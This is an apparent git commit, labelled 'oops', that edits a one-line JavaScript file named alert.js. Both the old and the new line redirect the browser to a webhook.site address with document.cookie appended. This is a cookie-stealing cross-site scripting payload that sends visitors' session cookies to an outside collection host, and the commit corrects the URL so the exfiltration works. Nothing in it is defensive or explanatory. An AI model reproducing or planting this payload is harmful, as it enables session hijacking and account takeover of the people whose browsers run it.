db958e44d214f6b2edcbce6d6fba654d834cdd21
Rahul Sridhar <sridhar.rahul@gmail.com>
2021-04-06 13:23:43 -0700

    oops

--- files/alert.js
+++ files/alert.js
@@ -1,1 +1,1 @@
-document.location = "https://webhook.site/#!/52cced41-9c40-46e3-8df0-c9921be7764d/?" + document.cookie
+document.location = "https://webhook.site/52cced41-9c40-46e3-8df0-c9921be7764d/?" + document.cookie
